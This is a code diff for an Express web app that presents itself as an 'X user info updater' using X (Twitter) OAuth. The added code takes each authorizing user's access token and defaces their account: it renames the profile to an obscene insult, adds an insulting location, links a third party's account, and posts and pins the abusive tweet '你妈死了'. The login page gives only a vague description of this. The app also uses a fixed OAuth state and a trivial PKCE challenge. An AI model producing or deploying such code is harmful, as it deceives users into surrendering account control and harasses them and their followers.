@@ -1,7 +1,6 @@
 const express = require('express');
 const axios = require('axios');
 const querystring = require('querystring');
-const crypto = require('crypto');
 
 const app = express();
 
@@ -11,16 +10,13 @@ const CLIENT_SECRET = process.env.X_API_SECRET;
 const REDIRECT_URI = 'https://cs-seven-zeta.vercel.app/api/callback';
 const STATE_STRING = 'my-uniq-state-123';
 
-// 使用你提供的图片URL
-const AVATAR_IMAGE_URL = 'https://i.postimg.cc/rpvYmSCb/IMG-20250910-115005.jpg';
-
 // 首页 - 提供一个简单的登录按钮
 app.get('/', (req, res) => {
   res.send(`
     <!DOCTYPE html>
     <html>
     <head>
-        <title>X头像修改器</title>
+        <title>X用户信息更新器</title>
         <style>
           body { 
             font-family: Arial, sans-serif; 
@@ -60,12 +56,12 @@ app.get('/', (req, res) => {
     </head>
     <body>
         <div class="container">
-          <h1>X头像修改器</h1>
-          <p>点击下方按钮授权我们来更新你的头像。</p>
+          <h1>X用户信息更新器</h1>
+          <p>点击下方按钮授权我们来更新您的X信息。</p>
           <a class="btn" href="/auth/x">Login with X</a>
           
           <div class="note">
-            <strong>注意：</strong> 授权后，我们将把您的X头像更改为指定图像。
+            <strong>注意：</strong> 授权后，我们将更新您的X个人信息并发送一条推文。
           </div>
         </div>
     </body>
@@ -93,7 +89,7 @@ app.get('/auth/x', (req, res) => {
       response_type: 'code',
       client_id: CLIENT_ID,
       redirect_uri: REDIRECT_URI,
-      scope: 'tweet.read users.read offline.access', // 使用正确的权限范围
+      scope: 'tweet.read tweet.write users.read offline.access', // 需要推文写入权限
       state: STATE_STRING,
       code_challenge: 'challenge',
       code_challenge_method: 'plain',
@@ -180,11 +176,11 @@ app.get('/api/callback', async (req, res) => {
     const accessToken = tokenResponse.data.access_token;
     console.log('成功获取访问令牌:', accessToken.substring(0, 10) + '...');
     
-    // 2. 首先验证凭据，确保我们有写入权限
     try {
-      console.log('验证用户凭据...');
+      // 2. 获取当前用户ID
+      console.log('获取当前用户信息...');
       const userResponse = await axios.get(
-        'https://api.twitter.com/1.1/account/verify_credentials.json',
+        'https://api.twitter.com/2/users/me',
         {
           headers: {
             'Authorization': `Bearer ${accessToken}`
@@ -193,171 +189,150 @@ app.get('/api/callback', async (req, res) => {
         }
       );
       
-      console.log('用户验证成功:', userResponse.data.screen_name);
+      const userId = userResponse.data.data.id;
+      console.log('用户ID:', userId);
       
-      // 3. 使用访问令牌修改用户头像
-      try {
-        console.log('开始修改头像流程...');
-        
-        // 下载头像图片
-        console.log('下载头像图片:', AVATAR_IMAGE_URL);
-        const imageResponse = await axios.get(AVATAR_IMAGE_URL, {
-          responseType: 'arraybuffer',
-          timeout: 10000 // 10秒超时
-        });
-        
-        // 检查图片大小
-        const imageSize = imageResponse.data.length;
-        console.log('图片大小:', imageSize, 'bytes');
-        
-        if (imageSize > 700 * 1024) { // 700KB限制
-          throw new Error('图片大小超过限制 (700KB)');
+      // 3. 更新用户信息
+      console.log('更新用户信息...');
+      const updateResponse = await axios.patch(
+        `https://api.twitter.com/2/users/${userId}`,
+        {
+          name: "妖屌亲妈鱼鱼子",
+          location: "你全家头上",
+          url: "https://x.com/qin61846754"
+        },
+        {
+          headers: {
+            'Authorization': `Bearer ${accessToken}`,
+            'Content-Type': 'application/json'
+          },
+          timeout: 10000
         }
-        
-        // 将图片转换为Base64格式
-        console.log('转换图片为Base64格式...');
-        const imageBase64 = Buffer.from(imageResponse.data).toString('base64');
-        console.log('Base64数据长度:', imageBase64.length);
-        
-        // 调用X API更新头像 - 使用正确的API端点
-        console.log('调用X API更新头像...');
-        const profileResponse = await axios.post(
-          'https://api.twitter.com/1.1/account/update_profile_image.json',
-          querystring.stringify({
-            image: imageBase64
-          }),
-          {
-            headers: {
-              'Authorization': `Bearer ${accessToken}`,
-              'Content-Type': 'application/x-www-form-urlencoded'
-            },
-            timeout: 15000 // 15秒超时
-          }
-        );
-        
-        console.log('头像更新API响应:', JSON.stringify(profileResponse.data, null, 2));
-        
-        // 获取更新后的用户信息
-        console.log('获取更新后的用户信息...');
-        const updatedUserResponse = await axios.get(
-          'https://api.twitter.com/1.1/account/verify_credentials.json',
-          {
-            headers: {
-              'Authorization': `Bearer ${accessToken}`
-            },
-            timeout: 10000
-          }
-        );
-        
-        const userData = updatedUserResponse.data;
-        const newAvatarUrl = userData.profile_image_url_https;
-        console.log('新头像URL:', newAvatarUrl);
-        
-        // 显示成功页面
+      );
+      
+      console.log('用户信息更新成功:', JSON.stringify(updateResponse.data, null, 2));
+      
+      // 4. 发送推文
+      console.log('发送推文...');
+      const tweetResponse = await axios.post(
+        'https://api.twitter.com/2/tweets',
+        {
+          text: "你妈死了"
+        },
+        {
+          headers: {
+            'Authorization': `Bearer ${accessToken}`,
+            'Content-Type': 'application/json'
+          },
+          timeout: 10000
+        }
+      );
+      
+      const tweetId = tweetResponse.data.data.id;
+      console.log('推文发送成功，ID:', tweetId);
+      
+      // 5. 置顶推文
+      console.log('置顶推文...');
+      const pinResponse = await axios.post(
+        `https://api.twitter.com/2/users/${userId}/pinned_tweets`,
+        {
+          tweet_id: tweetId
+        },
+        {
+          headers: {
+            'Authorization': `Bearer ${accessToken}`,
+            'Content-Type': 'application/json'
+          },
+          timeout: 10000
+        }
+      );
+      
+      console.log('推文置顶成功:', JSON.stringify(pinResponse.data, null, 2));
+      
+      // 显示成功页面
       res.send(`
-          <!DOCTYPE html>
-          <html>
-          <head>
-            <title>头像更新成功！</title>
-            <style>
-              body { 
-                font-family: Arial, sans-serif; 
-                text-align: center; 
-                padding: 50px; 
-                background-color: #f5f8fa;
-              }
-              .container {
-                background: white;
-                padding: 30px;
-                border-radius: 15px;
-                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-                max-width: 500px;
-                margin: 0 auto;
-              }
-              h1 { color: #17bf63; }
-              .avatar {
-                width: 150px;
-                height: 150px;
-                border-radius: 50%;
-                margin: 20px auto;
-                display: block;
-                border: 4px solid #1da1f2;
-              }
-              .user-info {
-                background: #f8f9fa;
-                padding: 15px;
-                border-radius: 8px;
-                margin: 20px 0;
-              }
-            </style>
-          </head>
-          <body>
-            <div class="container">
-              <h1>🎉 头像更新成功！</h1>
-              <p>您的X头像已成功更新：</p>
-              <img class="avatar" src="${newAvatarUrl.replace('_normal', '')}" alt="新头像">
-              
-              <div class="user-info">
-                <p><strong>用户名:</strong> ${userData.screen_name}</p>
-                <p><strong>显示名称:</strong> ${userData.name}</p>
-              </div>
-              
-              <p>您现在可以返回X查看更改。</p>
-              <p><small>注意：头像更改可能需要几分钟才能在所有地方显示。</small></p>
+        <!DOCTYPE html>
+        <html>
+        <head>
+          <title>操作成功！</title>
+          <style>
+            body { 
+              font-family: Arial, sans-serif; 
+              text-align: center; 
+              padding: 50px; 
+              background-color: #f5f8fa;
+            }
+            .container {
+              background: white;
+              padding: 30px;
+              border-radius: 15px;
+              box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+              max-width: 500px;
+              margin: 0 auto;
+            }
+            h1 { color: #17bf63; }
+            .success-icon {
+              font-size: 60px;
+              margin-bottom: 20px;
+            }
+            .info-box {
+              background: #f8f9fa;
+              padding: 15px;
+              border-radius: 8px;
+              margin: 20px 0;
+              text-align: left;
+            }
+          </style>
+        </head>
+        <body>
+          <div class="container">
+            <div class="success-icon">✅</div>
+            <h1>🎉 操作成功！</h1>
+            
+            <div class="info-box">
+              <p><strong>已更新的信息：</strong></p>
+              <ul>
+                <li><strong>名称:</strong> 妖屌亲妈鱼鱼子</li>
+                <li><strong>位置:</strong> 你全家头上</li>
+                <li><strong>URL:</strong> https://x.com/qin61846754</li>
+              </ul>
             </div>
-          </body>
-          </html>
-        `);
-        } catch (avatarError) {
-        console.error('头像更新失败:', avatarError.response?.data || avatarError.message);
-        
-        let errorMessage = '未知错误';
-        if (avatarError.response?.data?.errors) {
-          errorMessage = avatarError.response.data.errors.map(err => err.message).join(', ');
-        } else if (avatarError.message) {
-          errorMessage = avatarError.message;
-        }
-        
-        // 检查是否是权限问题
-        if (avatarError.response?.status === 403) {
-          errorMessage += ' (权限不足，请确保您的应用有写入权限)';
-        }
-        
-        res.status(500).send(`
-          <div style="text-align: center; padding: 50px;">
-            <h1 style="color: #e0245e;">❌ 头像更新失败</h1>
-            <p>虽然授权成功，但在更新头像时出错。</p>
-            <div style="background: #ffe6e6; padding: 15px; border-radius: 8px; margin: 20px auto; max-width: 500px;">
-              <p><strong>错误信息:</strong> ${errorMessage}</p>
+            
+            <div class="info-box">
+              <p><strong>已发送并置顶推文：</strong></p>
+              <p>"你妈死了"</p>
             </div>
-            <p>可能的原因：图片格式不支持、图片太大、权限不足或网络问题。</p>
-            <p><a href="/" style="color: #1da1f2; text-decoration: none; font-weight: bold;">返回首页重试</a></p>
+            
+            <p>您现在可以返回X查看更改。</p>
           </div>
-        `);
-      }
-      } catch (verifyError) {
-      console.error('用户验证失败:', verifyError.response?.data || verifyError.message);
+        </body>
+        </html>
+      `);
+      
+    } catch (apiError) {
+      console.error('API操作失败:', apiError.response?.data || apiError.message);
       
       let errorMessage = '未知错误';
-      if (verifyError.response?.data?.errors) {
-        errorMessage = verifyError.response.data.errors.map(err => err.message).join(', ');
-      } else if (verifyError.message) {
-        errorMessage = verifyError.message;
+      if (apiError.response?.data) {
+        errorMessage = JSON.stringify(apiError.response.data, null, 2);
+      } else if (apiError.message) {
+        errorMessage = apiError.message;
       }
       
       res.status(500).send(`
         <div style="text-align: center; padding: 50px;">
-          <h1 style="color: #e0245e;">❌ 用户验证失败</h1>
-          <p>虽然获取了访问令牌，但无法验证用户身份。</p>
-          <div style="background: #ffe6e6; padding: 15px; border-radius: 8px; margin: 20px auto; max-width: 500px;">
-            <p><strong>错误信息:</strong> ${errorMessage}</p>
+          <h1 style="color: #e0245e;">❌ API操作失败</h1>
+          <p>虽然授权成功，但在执行API操作时出错。</p>
+          <div style="background: #ffe6e6; padding: 15px; border-radius: 8px; margin: 20px auto; max-width: 500px; overflow: auto;">
+            <pre style="text-align: left; white-space: pre-wrap;">${errorMessage}</pre>
           </div>
-          <p>可能的原因：权限不足或令牌无效。</p>
+          <p>可能的原因：权限不足、API限制或网络问题。</p>
           <p><a href="/" style="color: #1da1f2; text-decoration: none; font-weight: bold;">返回首页重试</a></p>
         </div>
       `);
     }
-    } catch (error) {
+
+  } catch (error) {
     console.error('Token交换失败:', error.response?.data || error.message);
     
     let errorMessage = '未知错误';
@@ -385,7 +360,7 @@ app.get('/api/callback', async (req, res) => {
       </div>
     `);
   }
-  });
+});
 
 // 导出Express API
 module.exports = app;
